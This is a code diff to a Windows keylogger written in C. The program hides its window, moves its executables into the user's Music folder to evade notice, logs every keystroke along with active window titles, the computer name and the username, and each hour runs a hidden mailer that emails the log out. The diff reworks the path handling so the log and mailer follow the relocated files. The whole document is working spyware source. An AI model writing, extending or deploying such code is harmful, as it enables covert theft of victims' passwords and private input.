@@ -10,22 +10,25 @@
 #define LOG_TIMER 3600 // time limit until send email (3600s == 1 hour)
 
 // FUNCTION DECLARATIONS //
-void InstallKeylogger();
+void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory);
 char* GetTime();
 void HideWindow();
 void InitLogfile(char* filename);
 int GetLogfileLength(char* filename);
 void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_logfile);
-void ExecuteMailer();
+void ExecuteMailer(char* mailer_path, char* directory);
 void KeystrokeHandler(short key, FILE* logfile);
 
 // MAIN FUNCTION //
 int main(){
     // avoid visible detection of executable window
-    HideWindow();
+    //HideWindow();
 
     // install executables
-    InstallKeylogger();
+    char mailer_path[MAX_PATH];
+    char logfile_path[MAX_PATH];
+    char directory[MAX_PATH];
+    InstallKeylogger(mailer_path, logfile_path, directory);
 
     // initialize timers
     clock_t email_timer;               // tracks against LOG_TIMER
@@ -36,10 +39,6 @@ int main(){
     char new_window[BUF_SIZE];
     HWND foreground = GetForegroundWindow();
     GetWindowText(foreground, window, BUF_SIZE);
-
-    // initialize logfile
-    char filename[BUF_SIZE];
-    InitLogfile(filename);
 
     // active program process
     while(1){
@@ -55,7 +54,7 @@ int main(){
                 keystroke_timer = clock();
 
                 // open keylog file then handle keystroke
-                FILE* logfile = fopen(filename, "a");
+                FILE* logfile = fopen(logfile_path, "a");
                 GetCurrentWindow(window, new_window, logfile, 0);
                 KeystrokeHandler(key, logfile);
                 fclose(logfile);
@@ -69,9 +68,9 @@ int main(){
         if(email_timer > LOG_TIMER){
             
             // don't send empty files (5 lines is length of header)
-            if(GetLogfileLength(filename) > 5){
-                ExecuteMailer();        // email
-                InitLogfile(filename);  // clear logfile
+            if(GetLogfileLength(logfile_path) > 5){
+                ExecuteMailer(mailer_path, directory); // email
+                InitLogfile(logfile_path);             // clear logfile
             }
 
             // reset timer
@@ -84,27 +83,35 @@ int main(){
 // FUNCTION DEFINITIONS //
 
 // attempt to move the executables to another directory to be "less" detectable
-void InstallKeylogger(){
+void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory){
     // get current directory
-    char currentdir[MAX_PATH];
-    GetCurrentDirectory(MAX_PATH, currentdir);
+    char curr_directory[MAX_PATH];
+    GetCurrentDirectory(MAX_PATH, curr_directory);
 
     // create file path strings
     char keylogger_path[MAX_PATH];
-    char mailer_path[MAX_PATH];
-    sprintf(keylogger_path, "%s\\keylogger.exe", currentdir);
-    sprintf(mailer_path, "%s\\mailer.exe", currentdir);
-
+    sprintf(keylogger_path, "%s\\keylogger.exe", curr_directory);
+    sprintf(mailer_path, "%s\\mailer.exe", curr_directory);
+    strncpy(logfile_path, "log.txt", BUF_SIZE);
+    strncpy(directory, curr_directory, MAX_PATH);
+    
     // get current user's name
     DWORD len = BUF_SIZE+1;
     char username[BUF_SIZE+1];
     GetUserName(username, &len);
 
-    // build new file path
+    // build new file paths
     char keylogger_new_path[MAX_PATH];
     sprintf(keylogger_new_path, "C:\\Users\\%s\\Music\\keylogger.exe", username);
+    
     char mailer_new_path[MAX_PATH];
     sprintf(mailer_new_path, "C:\\Users\\%s\\Music\\mailer.exe", username);
+    
+    char logfile_new_path[MAX_PATH];
+    sprintf(logfile_new_path, "C:\\Users\\%s\\Music\\log.txt", username);
+    
+    char new_directory[MAX_PATH];
+    sprintf(new_directory, "C:\\Users\\%s\\Music\\", username);
 
     // attempt to execute in case of failure to install files in desired spot
     // move keylogger
@@ -115,10 +122,18 @@ void InstallKeylogger(){
 
         // move mailer
         BOOL moved2 = MoveFile(mailer_path, mailer_new_path);
-        
+
+        // if moved successfully, update file paths and make logfile
+        if(moved2){
+            strncpy(mailer_path, mailer_new_path, MAX_PATH);
+            strncpy(logfile_path, logfile_new_path, MAX_PATH);
+            strncpy(directory, new_directory, MAX_PATH);
+            InitLogfile(logfile_path);
+        }
         // if failed, move keylogger back and execute where it is
-        if(moved2 == FALSE){
+        else{
             MoveFile(keylogger_new_path, keylogger_path);
+            InitLogfile(logfile_path);
         }
     }
 }
@@ -155,7 +170,6 @@ void InitLogfile(char* filename){
     GetWindowText(foreground, window, BUF_SIZE);
 
     // open clean logfile and print out header
-    sprintf(filename, "%s_log.txt", username);
     FILE* logfile = fopen(filename, "w");
     fprintf(logfile, "COMPUTER: %s\nUSERNAME: %s\n", computername, username);
     GetCurrentWindow(window, window, logfile, 1);
@@ -200,18 +214,12 @@ void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_lo
 }
 
 // executes mailer module to send logfile
-void ExecuteMailer(){
+void ExecuteMailer(char* mailer_path, char* directory){
     PROCESS_INFORMATION pi;
     STARTUPINFO si = { sizeof(STARTUPINFO) };
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE; // hide new executable window
-
-    // get mailer path
-    char mailer_path[MAX_PATH];
-    char currentdir[MAX_PATH];
-    GetCurrentDirectory(MAX_PATH, currentdir);
-    sprintf(mailer_path, "%s\\mailer.exe", currentdir);
     
     // win32 version of fork() and exec()
     CreateProcess(
@@ -219,7 +227,8 @@ void ExecuteMailer(){
         NULL, NULL, NULL,
         FALSE,
         CREATE_NO_WINDOW,
-        NULL, NULL,
+        NULL, 
+        directory,
         &si, &pi
     );
 
